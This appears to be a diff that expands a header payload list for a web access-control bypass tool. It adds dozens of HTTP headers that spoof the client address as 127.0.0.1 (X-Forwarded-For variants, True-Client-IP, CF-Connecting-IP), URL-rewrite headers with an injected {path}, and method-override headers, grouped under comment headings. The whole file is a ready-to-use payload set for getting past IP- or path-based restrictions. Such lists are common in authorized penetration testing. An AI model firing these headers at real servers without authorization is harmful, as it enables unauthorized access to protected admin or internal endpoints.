@@ -1,11 +1,50 @@
+# ── IP Spoofing Headers ───────────────────────────────────────────
 Client-IP: 127.0.0.1
-X-Real-Ip: 127.0.0.1
-Redirect: 127.0.0.1
-Referer: 127.0.0.1
 X-Client-IP: 127.0.0.1
-X-Custom-IP-Authorization: 127.0.0.1
-X-Forwarded-By: 127.0.0.1
+X-Real-IP: 127.0.0.1
+X-Real-Ip: 127.0.0.1
+X-Remote-IP: 127.0.0.1
+X-Remote-Addr: 127.0.0.1
+X-Originating-IP: 127.0.0.1
+X-Original-Remote-Addr: 127.0.0.1
+X-ProxyUser-Ip: 127.0.0.1
+X-Cluster-Client-IP: 127.0.0.1
+X-True-IP: 127.0.0.1
+True-Client-IP: 127.0.0.1
+CF-Connecting-IP: 127.0.0.1
+Fastly-Client-IP: 127.0.0.1
+X-Azure-ClientIP: 127.0.0.1
+X-Azure-SocketIP: 127.0.0.1
+# ── Forwarded-For Variants ────────────────────────────────────────
 X-Forwarded-For: 127.0.0.1
+X-Forwarded-For: 127.0.0.1:80
+X-Forwarded-For: http://127.0.0.1
+X-Forwarded-For: 127.0.0.1,127.0.0.1
+X-Forward-For: 127.0.0.1
+Forwarded-For: 127.0.0.1
+Forwarded-For-Ip: 127.0.0.1
+Forwarded: for=127.0.0.1
+Forwarded: for=127.0.0.1;proto=http;by=127.0.0.1
+X-Forwarded-By: 127.0.0.1
+X-Forwarded-Server: 127.0.0.1
+# ── Host / Port Spoofing ──────────────────────────────────────────
+X-Host: 127.0.0.1
 X-Forwarded-Host: 127.0.0.1
 X-Forwarded-Port: 80
-X-True-IP: 127.0.0.1
+X-Forwarded-Port: 443
+X-Forwarded-Port: 8080
+X-Custom-IP-Authorization: 127.0.0.1
+# ── Redirect / Referer ────────────────────────────────────────────
+Redirect: 127.0.0.1
+Referer: 127.0.0.1
+Referer: http://127.0.0.1
+# ── URL Rewrite Headers (path injected at runtime) ────────────────
+X-Original-URL: {path}
+X-Rewrite-URL: {path}
+X-Override-URL: {path}
+Request-Uri: {path}
+X-Forwarded-Path: {path}
+# ── Method Override Headers ───────────────────────────────────────
+X-HTTP-Method-Override: GET
+X-HTTP-Method: GET
+X-Method-Override: GET
